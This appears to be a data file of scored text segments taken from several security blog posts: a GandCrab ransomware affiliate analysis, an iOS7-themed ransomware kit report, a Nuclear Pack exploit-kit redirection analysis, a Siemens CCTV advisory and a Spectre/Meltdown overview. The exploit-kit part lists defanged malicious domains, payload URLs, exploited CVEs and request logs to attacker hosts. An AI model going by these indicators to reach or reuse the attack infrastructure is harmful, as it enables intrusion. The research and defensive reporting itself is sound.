"In the cybercriminal underground there are several specialized services that can facilitate the preparation, pre-activity, activity and post-activity of financially driven cybercrime, as described by Erik van de Sandt [21].",0.028354401470021662
"Figure 11: Overview by Van de Sandt [21], displaying the services offered on Russian-language cybercriminal forums that predominantly facilitate financially driven computer-focused crimes. Each serves a specific purpose in the preparation, pre-activity, activity and post-activity of the commission of crime, and the protection of crime and the criminal.",0.015630045928965552
"Often, cybercriminals will choose to interact with several facilitating services to ensure that they have all the necessary elements in place to commit their intended crime. However, it is less common to see facilitating services forming alliances amongst themselves to become more successful. Recently, Goznym was another good example of cybercriminal services working together to gain more revenue [22].",0.019524767942771026
"By choosing to work together, facilitating services expose themselves to a certain risk since they must trust their newly formed alliance with their partner. However, having a good reputation in the underground and an overall feeling of impunity helps providers of those services to form partnerships.",0.014663513358795899
"GandCrab was a perfect example of a service, in this case ransomware, that teamed up with other services such as RIG and the Fallout exploit kit. These alliances helped GandCrab’s customers spread ransomware on a larger scale, thus generating more income and traffic for both services.",0.017059033451052863
GandCrab even used its popularity to issue an underground tender to find a new crypter service [23]. A crypter service provides malware obfuscation to evade detection by security products.,0.015478703360916835
Figure 12: Underground tender announcement for a new crypter service.,0.02166721008898176
"Eventually, NTCrypt won the tender and from then on offered a special price for customers of GandCrab.",0.015188511257220316
Figure 13: NTCrypt announcing that it had won GandCrab’s crypter tender.,0.013999552350069777
"This behaviour is very similar to legitimate companies forming strategic partnerships and undertaking mergers and acquisitions to stimulate growth, gain a competitive advantage and increase market share. Therefore, observing the formation of alliances between facilitating services and a Ransomware-as-a-Service provider can be a sign of significant growth of operations.",0.017173105948876555
Linking the ransomware to affiliates,0.009833164052111765
"Through our technical analysis, we established that, starting from version 4, GandCrab included certain hard-coded values in the ransomware source code:",0.007763852442286723
id: the affiliate id number.,0.016882820282361433
"sub_id: the sub id of the affiliate id – we suspect that affiliates can sub rent infections to their own partners, identifiable via the sub_id number. However, more research is needed to confirm this.",0.014450698008615537
version: the internal version number of the malware.,0.009995936784342074
Version 4 included a significant number of changes overall and we believe that these changes were made by the authors partly to improve administration and make GandCrab more scalable to cope with its increased popularity.,0.01269082841040614
A successful service model is dependent on a tight administration of earnings because every party needs to feel that they receive what they have earned.,0.016935198703009413
"Based on the hard-coded values it was possible for us, to a certain extent, to extract the administration information and create our own overview.",0.009010231402365898
"We hunted for as many different GandCrab samples as we could find using YARA rules, industry contacts and customer submissions. The sample list we gathered is quite extensive but not exhaustive.",0.014795445464159673
"From the collected samples we extracted the hard-coded values and compilation times automatically, using a custom-built tool. We aggregated all these values together in one giant timeline from version 4, all the way up to version 5.2 (Figure 14).",0.022272742332129947
Figure 14: Small portion of the timeline of collected samples (note the first four may be timestomped).,0.0251923098612874
At the time of writing we have collected 314 different samples. The collected samples were run simultaneously on the McAfee backend to find any internal detection telemetry.,0.01275773111746814
"Of all our collected samples we only found four that had an irregular compile time. This anomaly might indicate deliberate timestomping [24], or it could be a defect from unpacking. The rest of the samples had compile times that correlated closely with the release dates mentioned on the forums and the security product detection dates.",0.01304463973567671
ID and SUB_ID characteristics observed,0.0080595537772844
Parent-child relationship,0.009537486069455592
"The extracted IDs and Sub_IDs showed a parent-child relationship, meaning that every ID could have more than one SUB_ID (child), but every SUB_ID only had one ID (parent).",0.02343245102011493
Figure 15: The activity of ID number 41 (parent) and its corresponding SUB_IDs (children).,0.019830187967289636
ID increments,0.008642610443585275
"Overall, we observed a gradual increment in the ID number over time. The earlier versions generally had lower ID numbers and higher ID numbers appeared in the later versions.",0.012054109554884729
"However, there were relatively low ID numbers that appeared in many versions.",0.011399979890524436
"This observation aligned with our theory that the ID number corresponds with a particular affiliate. Certain affiliates remained partners for a long period of time, spreading different versions of GandCrab; this explains the ID number appearing over a longer period and in different versions. This theory has also been acknowledged by several (anonymous) sources.",0.014517960047492617
"Figure 16: Activity of ID number 15, from version 4.0 to version 5.04.",0.007141301267673095
Determining top IDs/affiliates,0.009558689101547224
"When we applied the theory that the ID corresponded with an affiliate, we observed different activity amongst the affiliates. There are some affiliates/IDs that were only linked to a single sample that we found. In some cases that specific sample was only found on a single source, like VirusTotal, and there were not any detections on our McAfee backend. This could occur when a sample was not spread, for instance, to a McAfee-protected system or if a single sample was, perhaps, indicative of a security researcher, undercover as an affiliate, only uploading their sample to VirusTotal. Another reason why affiliates might appear only for a short period is failure to perform. The GandCrab developers had a strict policy of expelling affiliates that underperformed. Expelling an affiliate would open a new slot that would receive a new incremented ID number.",0.014889648822491885
"On the other hand, we observed several very active affiliates, of which ID number 99 was by far the most active. We first observed ID 99 in six different samples of version 4.1.1, growing to 35 different samples in version 5.04. Based on our dataset we observed 71 unique unpacked samples linked to ID 99.",0.016291350455317932
"Being involved with several versions (consistency over time), in combination with the number of unique samples (volume) and the number of infections (based on industry malware detections) could effectively show which affiliate was the most aggressive and possibly the most important to the RaaS network.",0.015498159842083581
"This can be compared to a top sales person in any normal commercial organization. Given that the income of the RaaS network is partly dependent on the performance of its top affiliates, disrupting a top affiliate would have a crippling effect on the income of the RaaS network, internal morale and overall RaaS performance.",0.014713396001368784
SUB_ID role,0.008757073446473473
"Based on the child relationship of the SUB_ID we believe that this number might represent a build number or a method for the affiliate to run its own partner program for other individuals. Unfortunately, based on the information available, we are unable to determine its role with absolute certainty at this time.",0.011672037810367408
Overview versions and ID numbers,0.008000334988299218
"Using an online tool called RAWGraphs [25] we created an alluvial graphic display of the entire dataset, showing the relationship between the versions and the ID numbers. This is shown in Figure 17 – a more detailed overview can be supplied on request.",0.01247001929017344
Figure 17: Overview of versions and IDs.,0.011962870757831423
"Top performing affiliates immediately stood out from the rest as the lines were thicker and more spread out. Information like this can help law enforcement decide where to focus their valuable resources. From a security industry perspective, affiliate analysis will further ensure chain of custody, since a direct link from victim, sample and responsible affiliate can be drawn.",0.01617428543530708
Top affiliates missing in 5.2,0.01061921200339433
"When looking at the overview it does stand out that none of the top affiliates/ID numbers were present in version 5.2. We are unable to explain the exact cause of the absence of these IDs, but this might have been an early indicator that the end of GandCrab was imminent.",0.009824889521821145
Combining the sample timeline with a timeline of forum postings,0.01084982166622206
"One of the other key factors that made GandCrab popular was its forum presence and marketing strategy. Every new version was announced in a grand fashion (see Figure 18), almost comparable to those of major software companies.",0.011475475492737974
Figure 18: Announcement of GandCrab v5.,0.008629604453185835
"The timely announcements of new versions on the Exploit.in forum offered a way of checking if the compile times and hard‑coded version numbers matched up with the announcements by the actor. Based on all the samples we collected, only four had a different compile date; the rest of the samples found had a compile date a couple of days before the new version announcement, or shortly after. We proceeded to add the timestamps of the announcements to the sample timeline and colour-coded them in yellow, as shown in Figure 19.",0.014277526778426974
Figure 19: GandCrab forum announcement of version 5.03.,0.008077023711094089
"In addition to version announcements, the GandCrab Exploit.in forum thread also formed a lively discussion platform for individuals supporting and interested in the RaaS. Several forum users posted openly about their affiliation with GandCrab and spoke highly of the profits they earned.",0.014704306860058747
Figure 20: Forum posting of a user stating their affiliation with GandCrab ransomware.,0.01596719279987202
"This type of endorsement bears similarities to the social marketing of direct sales-based products. We are uncertain as to whether the affiliates endorsing GandCrab were doing this out of free will or if it was part of an internal marketing scheme. Overall, looking at the forum postings, one cannot help but notice that GandCrab gained a cult status amongst its followers.",0.015677478423200886
Colour coding and affiliate research,0.009104615932184257
"We added all the relevant forum thread postings to the existing timeline and colour-coded the postings based on their content. Forum users that stated that they were an affiliate were coded blue. Posts expressing positive sentiment towards GandCrab were colour-coded green and those expressing negative sentiment were coloured red. By adding the forum postings, the timeline gave an accurate representation of the actors interested in GandCrab and the evolution of the actual ransomware over time.",0.02235571186507157
"Figure 21: Timeline of version 5.03 announcement, enhanced with colour-coded forum postings.",0.017085344166111738
Continued analysis,0.008429974126384243
The colour-coded timeline overview provided several options for deeper affiliate research:,0.01086312463191641
"A user stating that they were affiliated with the RaaS at a moment X in time could serve as a reference marker that the person must have joined the RaaS prior to their statement. When we compared the statement timestamp to the ransomware ID numbers around the same time, we could estimate that the user must have had an ID number that was no higher than the highest ID number at the time of their statement. This offered a coarse method to link affiliates to a reduced number of ransomware samples.",0.014382563181941532
"Creating an overview of all the interests per affiliate/username on this and other forums gave us insight into a person’s interests (good or bad), which could be used for identification of the individual. Subsequently, analysing previous user activity could provide insight into their cybercriminal skill progression. Generally speaking, cybercriminals make more operational security (OpSec) mistakes earlier on in their career.",0.016579224949894722
The end of GandCrab,0.01043129391683062
"On Friday, 31 May 2019, the GandCrab crew released a statement saying that they were closing their business. That a RaaS was closing was not unusual, but GandCrab did it in a fashion true to its nature – overt, and with a lot of bravado.",0.014880142028297683
Figure 22: The GandCrab crew announces the end of its operations.,0.02351204790525474
"Looking closely at this statement, there are some interesting observations to be made:",0.01087513296555942
‘We successfully cashed this money and legalized it in various spheres of white business both in real life and on the Internet.’,0.017044242684759126
This means that they could have had a money laundering system in place to mix their earnings from the criminal underworld with legitimate businesses.,0.016491992116235754
"‘For a year of working with us, people have earned more than $ 2 billion.’",0.021210170353820668
‘We personally earned more than 150 million dollars per year.’,0.020729200298495787
"We think that this amount is largely exaggerated. Over the year, the NoMoreRansom decryptors helped a lot of victims to get their files back and prevented millions of dollars from falling into the hands of the GandCrab crew. However, based on the number of infections, we do believe that the individuals would have enough money to retire. Subsequently, our observations of the top affiliates being absent in version 5.2 might indicate an internal issue as a reason to stop.",0.011719722377302122
"‘We have proven that by doing evil deeds, retribution does not come.’",0.022597629662146845
"This again emphasizes the strong sense of impunity felt by the GandCrab crew and its affiliates. This is a worrisome thought since the space that GandCrab left will probably be filled quickly by a new RaaS system. Punishment always come after the crime, but we hope that, in this case, it will come sooner rather than later.",0.01552865902725531
"‘Victims – if you buy, now. Then your data no one will recover. Keys will be deleted.’",0.012544115853128424
This got a bit mangled through Google Translate but the original statement urged victims to pay up because the GandCrab crew were planning to delete all the decryption keys. It is kind of strange that the self-proclaimed millionaires did not show the slightest compassion. This statement evoked a lot of reaction in the forum thread where other well-respected users urged publication of the remaining keys to the public.,0.014848722182957852
Figure 23: Forum moderator urging release of the remaining keys.,0.015062142090381148
"Eventually, the GandCrab account requested suspension and deletion of all posts on the forum. The moderators did suspend the account but left the posts intact.",0.013537468478570291
Figure 24: Deactivation of the GandCrab account.,0.014968250913597658
Conclusion,0.008171308922719556
We started our research on GandCrab by carefully dissecting the malware and discovering its inner workings and secrets. The hard-coded indicators in the malware and GandCrab crew’s forum presence led us to dig deeper into the inner workings of the RaaS model. By doing so we gained some valuable insights:,0.014216212330278588
"Successful ransomware does not have to be the best coded ransomware, but the developers do have to be agile.",0.01444124038769401
"In order to grow, a RaaS model needs good accounting – to make sure that everyone gets their share.",0.019592109453472895
"In order to grow, a RaaS system needs strong alliances with complimentary services to drive infections and profits.",0.0167655195133406
"The success of a RaaS system is dependent on its affiliates; strong affiliates have a large influence. Disruption of top affiliates can have a crippling effect on the income, morale and overall success of the RaaS.",0.01825121090197268
A timeline analysis of a RaaS system can offer a method to single out top affiliates and spot potential events early on.,0.015955473759435623
"As an industry we must realize that we cannot stop cybercrime alone; we should aim to do more than just malware analysis, especially when it comes to fighting RaaS-type threats. Unfortunately, we live in a situation where most of the cybercriminals involved in ransomware can operate with a level of impunity; the ransomware developers are often in countries that make legal prosecution difficult and affiliates that are not caught can easily move from one RaaS to another and continue their extortion operations.",0.015835359356847212
"Law enforcement faces a daunting task to bring the individuals responsible to justice, but our industry’s knowledge, data and tooling can help with this task. The best way to cook a Crab is together.",0.01539968698496419
GandCrab might have shut down its operations but its developers and affiliates have still not been arrested and will probably continue to be active in cybercrime in one way or another.,0.0184089642756583
References,0.0158494738281566
"[1] Montenegro, D (@CryptoInsane). Twitter status. 26 January 2018. https://twitter.com/CryptoInsane/status/956803455833853952.",0.013136638369916409
"[2] Caltagirone, S.; Pendergast, A.; Betz, C. The Diamond Model of Intrusion Analysis. https://apps.dtic.mil/dtic/tr/fulltext/u2/a586960.pdf.",0.01203942585397999
[3] MalwareHunterTeam (@malwrhunterteam). Twitter presence. https://twitter.com/malwrhunterteam.,0.013793381667151272
[4] MalwareHunterTeam (@malwrhunterteam). Twitter status. 5 March 2018. https://twitter.com/malwrhunterteam/status/970746661231263745.,0.013214869752559477
[5] nao_sec (@nao_sec). Twitter status. 23 April 2018. https://twitter.com/nao_sec/status/988451194573017088.,0.012228788948696279
[6] Jawe (@zsawei). Twitter status. 10 May 2018. https://twitter.com/zsawei/status/994454718406578176.,0.012715428141242935
[7] NoMoreRansom. https://www.nomoreransom.org/.,0.012275687325706164
[8] Orthodox New Year 2019. Calendar Date.com. https://www.calendardate.com/orthodox_new_year_2019.htm.,0.014351503924041054
[9] EC3 (@EC3Europol). Twitter status. 19 March 2019. https://twitter.com/EC3Europol/status/1107984687253868545.,0.012088561995951541
"[10] Cimpanu, C. Vaccine Available for GandCrab Ransomware v4.1.2. Bleeping Computer. 19 July 2018. https://www.bleepingcomputer.com/news/security/vaccine-available-for-gandcrab-ransomware-v412/.",0.010348980563395394
[11] CVE-2018-8440. GitHub. https://github.com/sourceincite/CVE-2018-8440.,0.011552714121986773
[12] SandboxEscaper (@sandboxescaper). Twitter presence. https://twitter.com/sandboxescaper (suspended by Twitter).,0.016301230694652724
[13] CVE-2018-8120. GitHub. https://github.com/unamer/CVE-2018-8120.,0.012644964948430482
[14] Leeqwind. Win32k NULL-Pointer-Dereference Analysis by Matching the May Update. https://xiaodaozhi.com/exploit/156.html.,0.008477224989887233
[15] Threat Landscape Dashboard CVE-2018-8120. McAfee. https://www.mcafee.com/enterprise/es-es/threat-center/threat-landscape-dashboard/vulnerabilities-details.cve-2018-8120.html.,0.011536895203598463
[16] Valthek. AntiCrab. http://29wspy.ru/reversing/AntiCrab.zip.,0.011344097301378198
[17] Valthek. AntiCrab32. http://29wspy.ru/reversing/AntiCrab32.zip.,0.012466055709998702
[18] Valthek. AntiCrabWithoutPersistenceAndRemoveWallpaper32. http://29wspy.ru/reversing/AntiCrabWithoutPersistenceAndRemoveWallpaper32.zip.,0.011382631281219635
[19] Valthek. GandCrabSucksVaccine. http://29wspy.ru/reversing/GandCrabSucksVaccine.zip.,0.013454711692861165
[20] Valthek. GandAtom. http://29wspy.ru/reversing/GandAtom.zip.,0.012110652774326325
"[21] van der Sandt, E. Deviant Security: The Technical Computer Security Practices of Cyber Criminals. 2019. https://research-information.bristol.ac.uk/files/194364696/DEVIANT_SECURITY_EHAVANDESANDT.pdf.",0.010511683187197307
[22] Europol. Goznym malware: cybercriminal network dismantled in international operation. 16 May 2019. https://www.europol.europa.eu/newsroom/news/goznym-malware-cybercriminal-network-dismantled-in-international-operation.,0.011386866268327633
"[23] Mundo, A.; Fokker, J.; Roccia, T. Rapidly Evolving Ransomware GandCrab Version 5 Partners With Crypter Service for Obfuscation. McAfee. 10 October 2018. https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rapidly-evolving-ransomware-gandcrab-version-5-partners-with-crypter-service-for-obfuscation/.",0.013450370955194746
[24] MITRE ATT&CK. Timestomp. https://attack.mitre.org/techniques/T1099/.,0.012641257469972356
"[25] RAWGraphs. https://rawgraphs.io/.
",0.010915117552968367
iOS7 announcement prompts themed ransomware kits,0.010127380108512996
At Websense® Security Labs™ we recently spotted an interesting case of a phishing domain related to the imminent release of the Apple iOS7 Operating System.,0.015373292935989658
"As gossips circulate news in the wild about iOS7 after the D11 conference presented by Apple CEO Tim Cook, cybercriminals are setting up a foundation for phishing and malicious activities. The domain name was registered about 22 days ago (from the date of this analysis), as also reported by our ThreatSeeker® Intelligence Cloud:",0.013099047577275202
"At first glance, the host has no content other than an open directory, where we detected some interesting binary files:",0.00770276848542617
"While browsing through the content above, we opened the directory named ""vl"" and were immediately interested in the following result:",0.010217369119525643
"This is the control panel for the ransomware toolkit called ""Silence Locker"". In this case, we are viewing version 5, which is one of the latest released in 2013. As a ransomware toolkit, Silence Locker can generate a malicious file associated with familiar police enforcement pictures, based on the country of the potential victims. For example, in the following page the fake FBI Cyber Squad Investigation team is bound with a binary file that has been uploaded:",0.010871337244288792
The other files hosted on the same directory are all detected by our ThreatSeeker Intelligence Cloud as follows:,0.007406065242796078
"After a brief analysis of the binaries above, we noticed that the AutoIT tool was used to package the malware. This conforms to the current trend of packaging malware to make detection more difficult. We continued our investigation by gathering some telemetry about the IP address that hosts this domain (ios7news.net). From what we discovered, it seems that this IP address is also used for other phishing domains, using the infrastructure below:",0.013832341731845332
"The domain ""hxxp://gamingdaily.us"" is most likely a phishing domain for a gaming news website that is also used to host  the exploit kit BleedingLife. Here are some details:",0.013271475846293623
"In the first row, it's easy to spot the URL parameters that provide a malicious PDF file that exploits one of the most often-used PDF vulnerabilities (CVE-2010-0188).",0.009703735937178659
"It's also possible to detect other vulnerabilities used by this exploit kit, just by looking into the content:",0.006458850738601529
"The two red boxes show the java script code used to provide the optimal exploit, based on the victim's system configuration. The list of CVEs used by this exploit kit is reported here.  For worldwide events, both IT news and rumors could be used by the attackers to leverage people's curiosity, as was done here.  In this case, we can suppose (due to details such as the open directory access) that the attackers are going to use and configure that domain for malicious activities based on ransomware.
",0.010799555833952201
"Exploit Kit plays with smart redirection (amended)
Aleksandr Matrosov notes a new exploit kit approach to hiding redirects using implicit iFrame injection. (NB Nuclear Pack, not Blackhole.)",0.011985230800788282
5 Apr 2012 - 10:58AM,0.01095803183476407
"Aleksandr Matrosov notes a new exploit kit approach to hiding redirects using implicit iFrame injection. (NB Nuclear Pack, not Blackhole.)",0.008417821669715941
This week we have detected another interesting attack vector. This time cybercriminals are using an interesting technique for hiding malicious Javascripts and employ implicit iFrame injection. At this moment we are tracking hundreds of infected legitimate web sites in the Russian internet segment using this technique of infection. Let’s analyze this attack method step by step. (Since original publication there have been several updates to this story and they are at the bottom of this page.),0.011597533633257884
"If we look at the code on an infected webpage, we can find only one javascript file reference. No malicious iFrame is visible in the source code of infected webpage. In the next stage of our analysis we downloaded this javascript code from one of the infected sites (hxxp://winfield-oil.ru/javascript/script.js) for further analysis.",0.012030858770537
"After analysis we find the interesting javascript function below, using the strange domain name hxxp://onj42a.qpoctushpm.is-an-actor.com/g/: this script is downloaded and executed in the next phase of the attack.",0.012116235773967698
"Looking inside this script, we find some really interesting results. Inside the script a big chunk of code is obfuscated with a permutative encoding algorithm.",0.018412204183184455
After deobfuscation the malicious iFrame code looks like this:,0.012226691657005184
A code block inside the iFrame redirects us to the latest version of the Blackhole  Nuclear Pack exploit kit.,0.015625709859306225
We have tracked some interesting activity through the injected code block with iFrame redirection: Javascript code is used to capture mouse activity with the onmousemove event and only after that does malicious activity continue with the redirection. This activity enabled us to identify a simple method being used to bypass crawlers used by AV companies and others. These are the first steps towards the criminal’s proactive detection of real user activity for tracking detections and bypassing malware collecting by whitehat crawlers.,0.011669638274732774
"If we look at the Javascript code for exploiting the recent Java vulnerability CVE-2012-0507, we find that a remote Java applet is called using special parameters.",0.009291960330008342
"At the next stage of the exploitation process, the malicious java applet at hxxp://094t8g.qktsnwukvi.webhop.net//images/274e0118278c38ab7f4ef5f98b71d9dc.jar (Java/Exploit.CVE-2012-0507.J) uses these parameters for decoding an URL with executable file payload. Without this parameter, the URL can’t be decoded and the attacker can’t follow every step of theattack.",0.008140667945529256
The structure of objects in a Java/Exploit.CVE-2012-0507.J sample looks like this:,0.009586491398781649
The special parameter needed for decoding the URL (hxxp://094t8g.qktsnwukvi.webhop.net/server_privileges.php?7e9f0e75503391ed492e5abe22e1989e=2) serving the payload (in this case it was Win32/TrojanDownloader.Carberp.AH) is found in the method MyStart(String paramString) for the decoding algorithm.,0.008640140521843254
If the Java version on the client side is not vulnerable then the Blackhole Javascript tries instead  to attack using the PDF exploit JS/Exploit.Pdfka.PJN (CVE-2010-0188):,0.008091039051481563
Attackers search for ways to extend the lifetime of each obfuscation iteration or each infection of a legitimate website. It’s a natural evolution for drive-by download attacks to include malicious code employing proactive techniques for detectign real user activity and bypassing malware collecting systems.,0.01125999022480162
All malicious domains at the time of publication are hosted in the network belonging to Leksim Ltd/RELNET-NET AS5577.,0.009949417569154129
It’s not the first time this hosting provider has been involved in such activities and in April last year we were already seeing incidents originating from this network.,0.015577109702523129
Here’s a list of the more active domains over 24 hours:,0.010040725632654124
"yyzola.gpbbsdhmjm.shacknet.nu
64o5uf.inbyepkbja.dvrdns.org
n6slis.xvseedhxey.homeftp.net
rjohcj.gpbbsdhmjm.shacknet.nu
q1y2fi.yuundeswvt.is-a-libertarian.com
k82f3.neylwuugmd.est-mon-blogueur.com
gd2wt6.kuppnoynrl.gotdns.org
bvcydp.kuppnoynrl.gotdns.org
41kqki.neylwuugmd.est-mon-blogueur.com
a0z6o.klsauvnins.dyn-o-saur.com
lpjbikjwor.kicks-ass.net
3u5kj.inbyepkbja.dvrdns.org
86xsgn.qktsnwukvi.webhop.net
1rgrht.xvseedhxey.homeftp.net
gmov4d.xvseedhxey.homeftp.net
dkmcob.xvseedhxey.homeftp.net
a0z6o.klsauvnins.dyn-o-saur.com
j5pxed.xvseedhxey.homeftp.net
cynwoltxdo.dnsdojo.org
094t8g.qktsnwukvi.webhop.net",0.017381339808081542
"Special thanks to Vladimir Kropotov, independent security researcher from Russia, for some of the information used for  this post.",0.012019799692867261
"Aleksandr Matrosov
David Harley",0.009445740919321377
Updates:,0.00939381410223783
(1) Aleks reports:,0.011054109256931288
On April 3rd IP’s with Blackhole migrated on the latest version of Nuclear Pack.,0.016154085760383574
Proof logs:,0.009571682146816252
"02/Apr/2012
GET hxxp://dx6ts.yfwumdwyei.is-a-hunter.com/g/3854063525500425.js 62.122.79.32
02/Apr/2012
GET hxxp://yfwumdwyei.is-a-hunter.com/main.php?page=4f086f0830a83d5f 62.122.79.32 [Blackhole]
03/Apr/2012
GET hxxp://094t8g.qktsnwukvi.webhop.net/g/017432546059324.js 62.122.79.41
03/Apr/2012
GET hxxp://qktsnwukvi.webhop.net/main.php?page=4f086f0830a83d5f 62.122.79.41 [Blackhole]
03/Apr/2012
GET hxxp://pqiyoc.qktsnwukvi.webhop.net/g/697079368134578.js       62.122.79.41
03/Apr/2012
GET hxxp://094t8g.qktsnwukvi.webhop.net/server_privileges.php?e843aac68e6c4d6126926e60a1781536=2 62.122.79.41 [Nuclear Pack]",0.014292048657274847
(2) Steve Burn points out that AS5577 is actually Root eSolutions/Root SA: Leksim is one of their customers. A post at http://hphosts.blogspot.co.uk/2009/11/crimeware-friendly-isps-root-esolutions.html refers.,0.009375898856303744
"[Further update: there's a useful report of a major Nuclear Pack-related incident from Fox-IT at http://blog.fox-it.com/2012/03/16/post-mortem-report-on-the-sinowallnu-nl-incident/. However, in the case that Aleksandr has been looking at, there's an updated version that includes Java/Exploit.CVE-2012-0507.]",0.009181101172142325
"[Update: it turns out that it’s not Blackhole, but Nuclear Pack Version 2.0. Our apologies for the confusion. I’m hoping we’ll have more information for you shortly.]
",0.013244544368637201
"Siemens‑branded CCTV webcams require urgent firmware patch
Your business's CCTV camera could be coughing up your admin passwords. Patch now, or regret later.",0.015264372825482542
Graham Cluley,0.010131928644261823
22 Nov 2016 - 11:56AM,0.011112494056540911
"Your business’s CCTV camera could be coughing up your admin passwords. Patch now, or regret later.",0.014894214450197452
Siemens-branded IP-based CCTV cameras are the latest internet-connected devices to be found vulnerable to hacking attacks.,0.0161312737870708
"In this particular instance, according to a security advisory issued by Siemens, the vulnerability – known as CVE-2016-9155 – could be remotely exploited by malicious attackers to trick CCTV cameras into revealing admin passwords:",0.011917389222350083
"The latest update for SIEMENS-branded IP-based CCTV cameras fixes a vulnerability that could allow a remote attacker to obtain administrative credentials from the integrated web server.
Until patches can be applied, restricting access to the integrated web server with appropriate mechanisms is recommended",0.006864751363890753
"The following CCTV camera models, built by Vanderbilt Industries who acquired Siemens’ security product line in June last year, are said to be at risk:",0.008540833175982643
"CCMW3025: All versions prior to 1.41_SP18_S1
CVMW3025-IR: All versions prior to 1.41_SP18_S1
CFMW3025: All versions prior to 1.41_SP18_S1
CCPW3025: All versions prior to 0.1.73_S1
CCPW5025: All versions prior to 0.1.73_S1
CCMD3025-DN18: All versions prior to v1.394_S1
CCID1445-DN18: All versions prior to v2635
CCID1445-DN28: All versions prior to v2635
CCID1445-DN36: All versions prior to v2635
CFIS1425: All versions prior to v2635
CCIS1425: All versions prior to v2635
CFMS2025: All versions prior to v2635
CCMS2025: All versions prior to v2635
CVMS2025-IR: All versions prior to v2635
CFMW1025: All versions prior to v2635
CCMW1025: All versions prior to v2635",0.022632688326705286
"The good news is that Vanderbilt has released updates for the vulnerable devices. The further good news is that, to date, there is no evidence that any malicious hackers have exploited the vulnerability.",0.011917480225902666
"There is bad news, however.",0.02095729196863516
"Firstly, it sounds as if the attack is relatively trivial for an attacker to pull off by sending a carefully-formed but simple HTTP request.",0.014040901923920046
"Additionally, it’s easy to predict that many of the vulnerable devices may not have patches applied to them in a prompt fashion (if at all) – a common problem with the Internet of Things.",0.009799631916393103
Just making a patch available does not mean that the problem has gone away.,0.012733797795433266
"And that’s a problem. In the case of the Siemens-branded CCTV cameras they’re in use around the world at commercial facilities, in the healthcare industry and at government facilities. Not the kind of organizations that one imagines can afford to have their admin credentials leaked to cybercriminals.",0.010832051525041297
"This is, of course, far from the first time that flaws have been found in CCTV cameras that could be exploited by attackers.",0.015210950285221347
"For instance, last month there was a massive DDoS attack against domain name service Dyn, which in turn disrupted access to well-known sites such as Twitter, Pinterest, Reddit, and the Playstation network.",0.020484929486533576
"The DDoS attack was perpetrated by the Mirai botnet, powered by hijacked IoT devices, including hacked webcams.",0.020046423156890758
"As the Internet of (often insecure) Things expands, it poses a bigger threat to businesses and home users alike. ESET warned earlier this year that IoT would make more regular appearances in security headlines:",0.00787228772576154
"“For the future, the challenge for security in IoT is not restricted to the household. Technology keeps improving and time
and time again we see how governments, industries and markets in general are turning towards interconnectivity for all equipment, systems, and services. From market research to traffic systems, all things are being interconnected through existing technologies but, in certain cases, without the proper implementation of security protocols.”",0.01725218042779164
It feels to me that when it comes to IoT security things are going to get worse before they have any hope of getting better.,0.017843708967617555
And it’s also clear that news of the CCTV camera vulnerability has only added to a bad month for the Siemens brand in terms of security.,0.015813406240346106
"Earlier this month, the Department of Homeland Security’s ICS-CERT issued an alert that industrial control products developed by Siemens suffered from a local privilege escalation vulnerability that could leave SCADA equipment open to attack.
",0.011724265791695498
The looming spectre of a meltdown,0.008801276153173054
"After a flurry of rumors and speculation over the Christmas and New Year period, we’ve finally been given sight of two new whitepapers describing attacks named Spectre and Meltdown and a blog post from Google Project Zero describing a range of side-channel attacks against recent CPUs.",0.019535638253452836
"Editor's Note:
For the latest information on how this issue affects Forcepoint security products, please see the technical bulletin: Meltdown and Spectre Vulnerability",0.02064862832239056
"Update
2018 has gotten off to a tough start with the news of the Meltdown and Spectre (CVE-2017-5715, CVE-2017-5753, and CVE-2017-5754) vulnerabilities. This is a broad industry problem that affects almost everyone, everywhere. Processors from Intel, AMD, and ARM are all potentially vulnerable to at least one variant of Spectre or Meltdown which can be implemented within Apple, Linux and Windows environments. However, currently we are unaware of active exploits of this in the wild.
Forcepoint is working with our industry partners to examine these issues carefully and analyze the potential impact to our products, customers and resellers. While updates to systems may be required, due to the way our appliances and cloud operate, we can report today that our exposure is limited, as only our own trusted code should be running on these devices. As soon as patches are made available, Forcepoint will rigorously test these in our performance laboratory and will carefully assess the safest and most pragmatic way to proceed for our customers and partners.
It is important to note for someone to make use of the Spectre/Meltdown attacks requires malicious code to be executed on the target system. This is not a trivial point as the attack path is more complex than a simple phishing attack, for example.",0.01155678371150104
Original blog post,0.008430512093807407
"After a flurry of rumors and speculation over the Christmas and New Year period, we’ve finally been given sight of two new whitepapers describing the attacks and a blog post from Google Project Zero describing a range of side-channel attacks against recent CPUs.
The attacks (in brief)
Modern CPUs are, unsurprisingly, rather complicated devices: they have the ability to run multiple commands simultaneously and to capitalize on this they can execute some commands out-of-order.
In effect, this means that they can a) choose to execute commands further ahead in a program if something else (e.g. reading data from memory) is delaying the current one; and b) speculate on which branch of a program to follow after a decision point in execution.
Meltdown relies on the first type of out-of-order execution to read important OS memory and Spectre uses the latter ‘speculative execution’ approach.
Google’s research demonstrates attacks using these techniques, one of which successfully leaks host system data to a virtual machine being run within KVM on Linux. The use of Spectre to violate browser sandboxing using JavaScript is also described within the original whitepaper.
Who is affected?
Unfortunately, more or less everyone, albeit to differing extents. Processors from Intel, AMD, and Arm are all potentially vulnerable to at least one variant of the Spectre/Meltdown attack, and the attacks can be implemented within both Linux and Windows environments.
Analysis
Stepping into the realms of speculation (no pun intended) so soon after the publication of a major vulnerability is, as always, fraught with caveats.
On unpatched systems both Spectre and Meltdown attacks can aid code execution attacks by defeating ASLR and leaking important information about memory layout. With Spectre’s applicability to web browser sandboxing, it seems plausible that we will come to see attacks which attempt to use a similar technique to leak browsers’ memory layouts in preparation for the deployment of an arbitrary code execution exploit.
That said, while these vulnerabilities are very severe and widespread to an extent which certainly hasn’t been seen in recent times, the bases on which they were developed aren’t overly new: side-channel attacks pre-date the modern computer and ring0 escalations have been seen before.
Probably the most alarming of the proofs-of-concept released is the use of branch target injection (i.e. Spectre) to read host memory from inside a virtual machine. Again, this isn’t an entirely new concept: VM breakout bugs have naturally been of interest to researchers for quite some time, typically using virtual device drivers to attempt to run code on the host machine (e.g. Venom).
At the time of writing, it remains unclear as to whether or not some variant of Spectre could be used to inject code into the host machine as opposed to reading the contents of its memory – Intel believe this not to be viable – but, regardless, the ability to read host memory is a major security risk on its own and its ubiquity courtesy of being the result of a hardware flaw a major concern. It seems likely that mitigations against this in particular are likely to have a measurable performance impact until non-vulnerable hardware is developed, released, and deployed.
